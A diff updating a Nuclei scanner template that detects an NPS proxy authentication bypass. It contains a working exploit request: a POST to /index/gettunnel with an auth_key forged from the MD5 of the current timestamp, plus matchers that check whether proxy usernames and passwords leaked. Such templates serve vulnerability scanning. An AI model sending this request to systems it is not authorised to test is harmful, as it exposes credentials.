@@ -1,45 +1,43 @@
-id: check_NPS-AUTH-BYPASS
+id: nps-auth-bypass
+
 info:
-  name: check_NPS-AUTH-BYPASS
-  author: 51pwn
-  severity: critical
-  description: |+
-    https://saucer-man.com/information_security/748.html
+  name: NPS - Authentication Bypass
+  author: SleepingBag945
+  severity: high
+  description: |
+    This will reveal all parameters configured on the NPS, including the account username and password of the proxy.
   reference:
-    - https://github.com/hktalent/nuclei-templates
-    - https://51pwn.com
-  tags: web,go,microsoft,exchange,outlook
+    - https://mari0er.club/post/nps.html/
+  metadata:
+    max-request: 1
+    verified: true
+    shodan-query: html:"window.nps"
+  tags: nps,auth-bypass
 
-# nuclei -duc -u http://localhost:9999 -t ./51pwn/checkGoDebug.yaml
-variables:
-  TimeNow: '{{unix_time(10)}}'
-
-requests:
+http:
   - raw:
-      - |+
-        POST /index/hostlist HTTP/1.1
-        Host: {{Host}}
-        Accept-Encoding: gzip, deflate
-        Accept: */*
-        Connection: close
-        X-Requested-With: XMLHttpRequest
+      - |
+        POST /index/gettunnel HTTP/1.1
+        Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
 
-        auth_key={{md5(TimeNow)}}&timestamp={{TimeNow}}&offset=0&limit=10&search=
-        
-      # end payload
-    unsafe: true
+        auth_key={{md5(unix_time())}}&timestamp={{unix_time()}}&offset=0&limit=10&type=socks5&client_id=&search=
 
-    req-condition: true
-    stop-at-first-match: true
     matchers-condition: and
     matchers:
-      - type: status
-        status:
-          - 200
       - type: word
         part: body
         words:
-          - '"rows":'
-          - 'total":'
+          - '"VerifyKey":'
+          - 'Password":'
+          - 'Id":'
         condition: and
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+      - type: status
+        status:
+          - 200
